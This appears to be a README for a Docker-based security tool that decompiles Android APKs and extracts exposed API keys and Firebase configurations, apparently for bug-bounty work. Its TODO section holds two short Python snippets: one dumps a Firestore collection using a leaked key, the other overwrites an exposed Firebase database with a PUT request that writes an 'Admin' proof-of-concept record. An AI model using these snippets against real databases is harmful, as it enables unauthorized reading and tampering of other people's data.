# APK Playbook

A Docker-based tool for analyzing Android APK files and extracting sensitive information such as API keys, Firebase configurations, and other security-related data.

## Setup

1. Place your APK file in the `/app` directory
2. Build the Docker image:
   ```bash
   make build
   ```
3. Run the container:
   ```bash
   make run
   ```
4. If you want to run tools manually:
   ```bash
   make run-bash
   ```

All reports will be outputted to /output, I roccommend looking at the agneyastra reports.

## What it does

This tool will automatically:
- Decompile the APK file
- Extract GCP API keys, Firebase configurations, and other sensitive data
- Check Firebase Remote Config accessibility
- Generate detailed logs and reports

## Output

All extracted data and logs will be available in the `/app` directory within the container.

# Credit where credit is due
Agneyastra was pulled from https://github.com/JA3G3R/agneyastra and rewritten to python.

# TODO
Add firebase project dump
```python
import requests
api_key = 'AI**********************************zP8'
project_id = 'FIRESTORE_DB-PROJECT_NAME'
collection = 'COLLECTION_NAME'
url = f'https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}?key={api_key}'


response = requests.get(url)

if response.status_code == 200:
    print("Collection dump:", response.json())
else:
    print(f"Failed to retrieve data: {response.status_code} - {response.text}")
```

Add firebase .json overwrite
```python
import requests

## THIS IS AN EXAMPLE OF JSON DATA TO UPLOAD TO THE DATABASE. CHANGE AS YOU SEE FIT
data = {"Mexploit": "BugBountyHunter", "Email": "<EMAIL>", "Role": "Admin", "Message" : "this is a PoC for your misconfigured firebase instance. A misconfigured instance could allow attackers to read, write, and manage a firebase db for their own nefarious actions. Please secure this immediately."}

## HERE YOU WILL ENTER THE URL OF THE EXPOSED DB WITH THE ./json APPENDED
response = requests.put('<URL OF EXPOSED FIREBASEDB>',json=data)

## IF SUCCESSFUL YOU WILL GET A MESSAGE TO TERMINAL
print("Executed the PoC Successfully")
```
